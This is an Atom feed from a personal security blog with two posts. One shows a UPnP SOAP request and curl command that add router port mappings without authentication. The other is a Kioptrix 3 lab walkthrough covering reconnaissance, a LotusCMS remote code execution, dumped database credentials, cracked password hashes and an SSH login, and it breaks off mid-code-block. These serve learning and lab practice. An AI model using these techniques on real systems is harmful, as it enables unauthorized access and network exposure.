<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[PaulSec's blog]]></title>
  <link href="http://paulsec.github.io/atom.xml" rel="self"/>
  <link href="http://paulsec.github.io/"/>
  <updated>2014-07-31T23:19:57+02:00</updated>
  <id>http://paulsec.github.io/</id>
  <author>
    <name><![CDATA[Paul A. (PaulSec)]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Experiments with UPnP]]></title>
    <link href="http://paulsec.github.io/blog/2014/07/03/experiments-with-upnp/"/>
    <updated>2014-07-03T22:06:06+02:00</updated>
    <id>http://paulsec.github.io/blog/2014/07/03/experiments-with-upnp</id>
    <content type="html"><![CDATA[<p>This post deals with recent observations regarding UPnP (<em>Universal Plug and Play</em>) protocol &amp; Routers.
In few words, thanks to this protocol, devices (such as file sharing services, games, ..) can be easily connected/deployed.</p>

<p>First, I started to do research on my box to find relevant UPnP functionalities by hand, found some but I had trouble to exploit them.
Few days ago, David Middlehurst released a tool called <a href="https://github.com/nccgroup/UPnP-Pentest-Toolkit">&ldquo;UPnP Pentest Toolkit&rdquo;</a>.</p>

<p>Quick description of the tool that you can find on Github:</p>

<p><em>This tool aims to bring together a range of UPnP assessment features, enabling quick assessment with minimal configuration and set-up. It has been developed to aid security consultants in exploring, spoofing and manipulating of UPnP devices and the underlying protocols at work. It is intended as a proof of concept to be used for research purposes in a trusted environment.</em></p>

<p>I decided to try it, and I was able to browse all my devices having UPnpP functionalities.
I&rsquo;ll not go through all the features of the tool but feel free to check it out. I&rsquo;ll mostly speak about my experiment using my router.</p>

<p>The version of my router didn&rsquo;t &ldquo;allow&rdquo; me to NAT ports so I couldn&rsquo;t access my internal SSH Server, Web servers, VPN etc.
Clearly, marketing bullshit.
However, thanks to this tool, I managed to enumerate the different functions that I was allowed to perform. Here is the list:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Actions:
</span><span class='line'>    GetSpecificPortMappingEntry
</span><span class='line'>        &lt;-NewLeaseDuration
</span><span class='line'>            Data Type: ui4
</span><span class='line'>        &lt;-NewPortMappingDescription
</span><span class='line'>            Data Type: string
</span><span class='line'>        &lt;-NewEnabled
</span><span class='line'>            Data Type: boolean
</span><span class='line'>        &lt;-NewInternalClient
</span><span class='line'>            Data Type: string
</span><span class='line'>        &lt;-NewInternalPort
</span><span class='line'>            Data Type: ui2
</span><span class='line'>        -&gt;NewProtocol
</span><span class='line'>            Allowed Value 2: UDP
</span><span class='line'>            Allowed Value 1: TCP
</span><span class='line'>            Data Type: string
</span><span class='line'>        -&gt;NewExternalPort
</span><span class='line'>            Data Type: ui2
</span><span class='line'>        -&gt;NewRemoteHost
</span><span class='line'>            Data Type: string
</span><span class='line'>    GetGenericPortMappingEntry
</span><span class='line'>        &lt;-NewLeaseDuration
</span><span class='line'>            Data Type: ui4
</span><span class='line'>        &lt;-NewPortMappingDescription
</span><span class='line'>            Data Type: string
</span><span class='line'>        &lt;-NewEnabled
</span><span class='line'>            Data Type: boolean
</span><span class='line'>        &lt;-NewInternalClient
</span><span class='line'>            Data Type: string
</span><span class='line'>        &lt;-NewInternalPort
</span><span class='line'>            Data Type: ui2
</span><span class='line'>        &lt;-NewProtocol
</span><span class='line'>            Allowed Value 2: UDP
</span><span class='line'>            Allowed Value 1: TCP
</span><span class='line'>            Data Type: string
</span><span class='line'>        &lt;-NewExternalPort
</span><span class='line'>            Data Type: ui2
</span><span class='line'>        &lt;-NewRemoteHost
</span><span class='line'>            Data Type: string
</span><span class='line'>        -&gt;NewPortMappingIndex
</span><span class='line'>            Data Type: ui2
</span><span class='line'>    ForceTermination
</span><span class='line'>    RequestConnection
</span><span class='line'>    GetConnectionTypeInfo
</span><span class='line'>        &lt;-NewPossibleConnectionTypes
</span><span class='line'>            Allowed Value 3: IP_Bridged
</span><span class='line'>            Allowed Value 2: IP_Routed
</span><span class='line'>            Allowed Value 1: Unconfigured
</span><span class='line'>            Data Type: string
</span><span class='line'>        &lt;-NewConnectionType
</span><span class='line'>            Data Type: string
</span><span class='line'>    SetConnectionType
</span><span class='line'>        -&gt;NewConnectionType
</span><span class='line'>            Data Type: string
</span><span class='line'>    DeletePortMapping
</span><span class='line'>        -&gt;NewProtocol
</span><span class='line'>            Allowed Value 2: UDP
</span><span class='line'>            Allowed Value 1: TCP
</span><span class='line'>            Data Type: string
</span><span class='line'>        -&gt;NewExternalPort
</span><span class='line'>            Data Type: ui2
</span><span class='line'>        -&gt;NewRemoteHost
</span><span class='line'>            Data Type: string
</span><span class='line'>    GetExternalIPAddress
</span><span class='line'>        &lt;-NewExternalIPAddress
</span><span class='line'>            Data Type: string
</span><span class='line'>    AddPortMapping
</span><span class='line'>        -&gt;NewLeaseDuration
</span><span class='line'>            Data Type: ui4
</span><span class='line'>        -&gt;NewPortMappingDescription
</span><span class='line'>            Data Type: string
</span><span class='line'>        -&gt;NewEnabled
</span><span class='line'>            Data Type: boolean
</span><span class='line'>        -&gt;NewInternalClient
</span><span class='line'>            Data Type: string
</span><span class='line'>        -&gt;NewInternalPort
</span><span class='line'>            Data Type: ui2
</span><span class='line'>        -&gt;NewProtocol
</span><span class='line'>            Allowed Value 2: UDP
</span><span class='line'>            Allowed Value 1: TCP
</span><span class='line'>            Data Type: string
</span><span class='line'>        -&gt;NewExternalPort
</span><span class='line'>            Data Type: ui2
</span><span class='line'>        -&gt;NewRemoteHost
</span><span class='line'>            Data Type: string
</span><span class='line'>    GetCommonLinkProperties
</span><span class='line'>        &lt;-NewPhysicalLinkStatus
</span><span class='line'>            Allowed Value 4: Unavailable
</span><span class='line'>            Allowed Value 3: Initializing
</span><span class='line'>            Allowed Value 2: Down
</span><span class='line'>            Allowed Value 1: Up
</span><span class='line'>            Data Type: string
</span><span class='line'>        &lt;-NewLayer1DownstreamMaxBitRate
</span><span class='line'>            Data Type: ui4
</span><span class='line'>        &lt;-NewLayer1UpstreamMaxBitRate
</span><span class='line'>            Data Type: ui4
</span><span class='line'>        &lt;-NewWANAccessType
</span><span class='line'>            Allowed Value 4: Ethernet
</span><span class='line'>            Allowed Value 3: Cable
</span><span class='line'>            Allowed Value 2: POTS
</span><span class='line'>            Allowed Value 1: DSL
</span><span class='line'>            Data Type: string
</span><span class='line'>    GetDefaultConnectionService
</span><span class='line'>        &lt;-NewDefaultConnectionService
</span><span class='line'>            Data Type: string
</span><span class='line'>    SetDefaultConnectionService
</span><span class='line'>        -&gt;NewDefaultConnectionService
</span><span class='line'>            Data Type: string
</span><span class='line'>
</span><span class='line'>            (...)</span></code></pre></td></tr></table></div></figure>


<p>One of them was interesting. Saw which one? &ndash; the <strong>AddPortMapping</strong> functionality.
Thanks to this, you can add a &ldquo;Port Mapping&rdquo; or directly create a NAT rule. Without authentication, just one HTTP Request.</p>

<p>Format of UPnP communication is based on SOAP (<em>Simple Object Access Protocol</em>) and its structure is composed of an &ldquo;envelope&rdquo;, a XML-based structure.
Here is the structure for the AddPortMapping request:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='xml'><span class='line'><span class="cp">&lt;?xml version=&quot;1.0&quot;?&gt;</span>
</span><span class='line'><span class="nt">&lt;s:Envelope</span> <span class="na">xmlns:s=</span><span class="s">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span> <span class="na">s:encodingStyle=</span><span class="s">&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;</span><span class="nt">&gt;</span>
</span><span class='line'>    <span class="nt">&lt;s:Body&gt;</span>
</span><span class='line'>        <span class="nt">&lt;u:AddPortMapping</span> <span class="na">xmlns:u=</span><span class="s">&quot;urn:schemas-upnp-org:service:WANPPPConnection:1&quot;</span><span class="nt">&gt;</span>
</span><span class='line'>            <span class="nt">&lt;NewRemoteHost&gt;&lt;/NewRemoteHost&gt;</span>
</span><span class='line'>            <span class="nt">&lt;NewExternalPort&gt;</span>9999<span class="nt">&lt;/NewExternalPort&gt;</span>
</span><span class='line'>            <span class="nt">&lt;NewProtocol&gt;</span>TCP<span class="nt">&lt;/NewProtocol&gt;</span>
</span><span class='line'>            <span class="nt">&lt;NewInternalPort&gt;</span>9999<span class="nt">&lt;/NewInternalPort&gt;</span>
</span><span class='line'>            <span class="nt">&lt;NewInternalClient&gt;</span>192.168.1.91<span class="nt">&lt;/NewInternalClient&gt;</span>
</span><span class='line'>            <span class="nt">&lt;NewEnabled&gt;</span>1<span class="nt">&lt;/NewEnabled&gt;</span>
</span><span class='line'>            <span class="nt">&lt;NewPortMappingDescription&gt;</span>omgwtfbbq<span class="nt">&lt;/NewPortMappingDescription&gt;</span>
</span><span class='line'>            <span class="nt">&lt;NewLeaseDuration&gt;</span>0<span class="nt">&lt;/NewLeaseDuration&gt;</span>
</span><span class='line'>        <span class="nt">&lt;/u:AddPortMapping&gt;</span>
</span><span class='line'>    <span class="nt">&lt;/s:Body&gt;</span>
</span><span class='line'><span class="nt">&lt;/s:Envelope&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>You can find useful information on <a href="http://www.upnp-hacks.org/igd.html">UPnP hacks</a> &ndash; contains amazing resources on UPnP.</p>

<p>Well, to send directly a SOAP from Linux, here is an &ldquo;easy-way&rdquo; if you want to do it by hand:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>curl -X POST --data @body_soap.txt http://192.168.1.254:46465/ctl/IPConn -H <span class="s1">&#39;SOAPAction: &quot;urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping&quot;&#39;</span> -H <span class="s1">&#39;Host: 192.168.1.254:46465&#39;</span>
</span></code></pre></td></tr></table></div></figure>


<p>And in <strong>body_soap.txt</strong> the XML structure with all the settings defined as we saw above.</p>

<p>If the request succeeded, the response should looks like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='xml'><span class='line'><span class="cp">&lt;?xml version=&quot;1.0&quot;?&gt;</span>
</span><span class='line'><span class="nt">&lt;s:Envelope</span> <span class="na">xmlns:s=</span><span class="s">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span> <span class="na">s:encodingStyle=</span><span class="s">&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;</span><span class="nt">&gt;&lt;s:Body&gt;&lt;u:AddPortMappingResponse</span> <span class="na">xmlns:u=</span><span class="s">&quot;urn:schemas-upnp-org:service:WANIPConnection:1&quot;</span><span class="nt">/&gt;&lt;/s:Body&gt;&lt;/s:Envelope&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>So, in few words:</p>

<ul>
<li>Learning stuffs about UPnP was fun and I&rsquo;m sure there&rsquo;s even more to do with it,</li>
<li>UPT is a fun tool,</li>
<li>I found nice tricks, and I can now NAT ports easily bypassing ISP&rsquo;s stupid rules.</li>
</ul>


<p>I think I&rsquo;ll write another post on WFA-Device which stands for <em>Wi-Fi Alliance Device</em> and their UPnP functionalities.
It seems there&rsquo;s some fun stuffs about it.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Kioptrix 3: Write-up]]></title>
    <link href="http://paulsec.github.io/blog/2014/06/12/kioptrix-3-write-up/"/>
    <updated>2014-06-12T21:44:04+02:00</updated>
    <id>http://paulsec.github.io/blog/2014/06/12/kioptrix-3-write-up</id>
    <content type="html"><![CDATA[<p>This has been some long time I haven&rsquo;t written another write-up.
This one&rsquo;s for Kioptrix 3 that you can find <a href="">here</a>.</p>

<h3><strong>Host Discovery</strong></h3>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ nmap -sP 192.168.56.1/24</span></code></pre></td></tr></table></div></figure>


<p>and we got the IP address : <code>192.168.56.101</code>.</p>

<p>As it was explained, you need to add <code>192.168.56.101 kioptrix3.com</code> in your <strong>/etc/hosts</strong>.</p>

<h3><strong>Fingerprinting</strong></h3>

<p>Then, let&rsquo;s find what kind of services are running on the host machine.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ nmap 192.168.56.101 -sV -A 
</span><span class='line'>
</span><span class='line'>Starting Nmap 6.46 ( http://nmap.org ) at 2014-06-12 20:15 CEST
</span><span class='line'>Nmap scan report for malicious (192.168.56.101)
</span><span class='line'>Host is up (0.00034s latency).
</span><span class='line'>Not shown: 998 closed ports
</span><span class='line'>PORT   STATE SERVICE VERSION
</span><span class='line'>22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
</span><span class='line'>| ssh-hostkey: 
</span><span class='line'>|   1024 30:e3:f6:dc:2e:22:5d:17:ac:46:02:39:ad:71:cb:49 (DSA)
</span><span class='line'>|_  2048 9a:82:e6:96:e4:7e:d6:a6:d7:45:44:cb:19:aa:ec:dd (RSA)
</span><span class='line'>80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
</span><span class='line'>|_http-methods: No Allow or Public header in OPTIONS response (status code 200)
</span><span class='line'>|_http-title: Ligoat Security - Got Goat? Security ...
</span><span class='line'>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span><span class='line'>
</span><span class='line'>Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
</span><span class='line'>Nmap done: 1 IP address (1 host up) scanned in 10.59 seconds</span></code></pre></td></tr></table></div></figure>


<p>Quite obvious, let&rsquo;s check this Web server !</p>

<h3><strong>Reconnaissance</strong></h3>

<p>Thanks to Nikto, we managed to find useful informations:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>(...)
</span><span class='line'>+ OSVDB-3092: /phpmyadmin/changelog.php: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.
</span><span class='line'>+ OSVDB-3268: /icons/: Directory indexing found.
</span><span class='line'>+ Cookie phpMyAdmin created without the httponly flag
</span><span class='line'>(...)</span></code></pre></td></tr></table></div></figure>


<p>And with DirBuster:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>(...)
</span><span class='line'>Dir found: /gallery/ - 500
</span><span class='line'>File found: /gallery/index.php - 500
</span><span class='line'>File found: /gallery/recent.php - 500
</span><span class='line'>Dir found: /gallery/p.php/ - 500
</span><span class='line'>Dir found: /gallery/g.php/ - 500
</span><span class='line'>Dir found: /gallery/themes/ - 200
</span><span class='line'>(...)</span></code></pre></td></tr></table></div></figure>


<p>Moreover, by navigating on the website, I managed to get the CMS behind:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">&quot;keywords&quot;</span> <span class="na">content=</span><span class="s">&quot;LotusCMS&quot;</span> <span class="nt">/&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<h3><strong>Exploitation</strong></h3>

<p>Thanks to this information, I looked on Exploit-db for <a href="http://www.exploit-db.com/search/?action=search&amp;filter_page=1&amp;filter_description=&amp;filter_exploit_text=LotusCMS&amp;filter_author=&amp;filter_platform=0&amp;filter_type=0&amp;filter_lang_id=0&amp;filter_port=&amp;filter_osvdb=&amp;filter_cve=">some known vulnerabilities</a>.</p>

<p><strong>Bingo</strong>, there was. :&ndash;)</p>

<p>I ran metasploit and exploited this <a href="http://www.exploit-db.com/exploits/18565/"><em>eval() Remote Command Execution</em></a>.
I managed to get a (limited) meterpreter session on the machine, and retrieved different files on the filesystem such as configuration file <code>gconfig.php</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
</span><span class='line'>    <span class="nb">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span><span class='line'>    <span class="cm">/*</span>
</span><span class='line'><span class="cm">        A sample Gallarific configuration file. You should edit</span>
</span><span class='line'><span class="cm">        the installer details below and save this file as gconfig.php</span>
</span><span class='line'><span class="cm">        Do not modify anything else if you don&#39;t know what it is.</span>
</span><span class='line'><span class="cm">    */</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">// Installer Details -----------------------------------------------</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">// Enter the full HTTP path to your Gallarific folder below,</span>
</span><span class='line'>    <span class="c1">// such as http://www.yoursite.com/gallery</span>
</span><span class='line'>    <span class="c1">// Do NOT include a trailing forward slash</span>
</span><span class='line'>
</span><span class='line'>    <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s2">&quot;gallarific_path&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;http://kioptrix3.com/gallery&quot;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s2">&quot;gallarific_mysql_server&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;localhost&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s2">&quot;gallarific_mysql_database&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;gallery&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s2">&quot;gallarific_mysql_username&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;root&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s2">&quot;gallarific_mysql_password&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;fuckeyou&quot;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">// Setting Details -------------------------------------------------</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$g_mysql_c</span> <span class="o">=</span> <span class="o">@</span><span class="nb">mysql_connect</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s2">&quot;gallarific_mysql_server&quot;</span><span class="p">],</span> <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s2">&quot;gallarific_mysql_username&quot;</span><span class="p">],</span> <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s2">&quot;gallarific_mysql_password&quot;</span><span class="p">]))</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;A connection to the database couldn&#39;t be established: &quot;</span> <span class="o">.</span> <span class="nb">mysql_error</span><span class="p">());</span>
</span><span class='line'>        <span class="k">die</span><span class="p">();</span>
</span><span class='line'><span class="p">}</span><span class="k">else</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$g_mysql_d</span> <span class="o">=</span> <span class="o">@</span><span class="nb">mysql_select_db</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s2">&quot;gallarific_mysql_database&quot;</span><span class="p">],</span> <span class="nv">$g_mysql_c</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;The Gallarific database couldn&#39;t be opened: &quot;</span> <span class="o">.</span> <span class="nb">mysql_error</span><span class="p">());</span>
</span><span class='line'>        <span class="k">die</span><span class="p">();</span>
</span><span class='line'>    <span class="p">}</span><span class="k">else</span> <span class="p">{</span>
</span><span class='line'>        <span class="nv">$settings</span><span class="o">=</span><span class="nb">mysql_query</span><span class="p">(</span><span class="s2">&quot;select * from gallarific_settings&quot;</span><span class="p">);</span>
</span><span class='line'>        <span class="k">if</span><span class="p">(</span><span class="nb">mysql_num_rows</span><span class="p">(</span><span class="nv">$settings</span><span class="p">)</span><span class="o">!=</span><span class="mi">0</span><span class="p">){</span>
</span><span class='line'>            <span class="k">while</span><span class="p">(</span><span class="nv">$data</span><span class="o">=</span><span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nv">$settings</span><span class="p">)){</span>
</span><span class='line'>                <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s2">&quot;</span><span class="si">{</span><span class="nv">$data</span><span class="p">[</span><span class="s1">&#39;settings_name&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">]</span><span class="o">=</span><span class="nv">$data</span><span class="p">[</span><span class="s1">&#39;settings_value&#39;</span><span class="p">];</span>
</span><span class='line'>            <span class="p">}</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>Thanks to those credentials, I managed to access the phpMyAdmin and dumped all databases.</p>

<p>I got different hashes:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="nx">dreg</span><span class="o">:</span><span class="mi">0</span><span class="nx">d3eccfb887aabd50f243b3f155c0f85</span> <span class="o">=&gt;</span> <span class="nx">Mast3r</span>
</span><span class='line'><span class="nx">loneferret</span><span class="o">:</span><span class="mi">5</span><span class="nx">badcaf789d3d1d09794d8f021f40f0e</span> <span class="o">=&gt;</span> <span class="nx">starwars</span>
</span></code></pre></td></tr></table></div></figure>


<p>Moreover, I had the admin&rsquo;s password: <strong>n0t7t1k4</strong>.</p>

<p>I managed to log in with loneferret&rsquo;s credentials on the SSH service.</p>

<p>I checked the files which were in the home folder and I found <code>CompanyPolicy.README</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="err">$</span> <span class="nx">cat</span> <span class="nx">CompanyPolicy</span><span class="o">.</span><span class="nx">README</span>
</span><span class='line'><span class="nx">Hello</span> <span class="k">new</span> <span class="nx">employee</span><span class="p">,</span>
</span><span class='line'><span class="nx">It</span> <span class="nx">is</span> <span class="nx">company</span> <span class="nx">policy</span> <span class="nx">here</span> <span class="nx">to</span> <span class="k">use</span> <span class="nx">our</span> <span class="nx">newly</span> <span class="nx">installed</span> <span class="nx">software</span> <span class="k">for</span> <span class="nx">editing</span><span class="p">,</span> <span class="nx">creating</span> <span class="k">and</span> <span class="nx">viewing</span> <span class="nx">files</span><span class="o">.</span>
</span><span class='line'><span class="nx">Please</span> <span class="k">use</span> <span class="nx">the</span> <span class="nx">command</span> <span class="s1">&#39;sudo ht&#39;</span><span class="o">.</span>
</span><span class='line'><span class="nx">Failure</span> <span class="nx">to</span> <span class="k">do</span> <span class="nx">so</span> <span class="nx">will</span> <span class="nx">result</span> <span class="nx">in</span> <span class="nx">you</span> <span class="nx">immediate</span> <span class="nx">termination</span><span class="o">.</span>
</span><span class='line'>
</span><span class='line'><span class="nx">DG</span>
</span><span class='line'><span class="nx">CEO</span>
</span></code></pre></td></tr></table></div></figure>


<p>And then:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
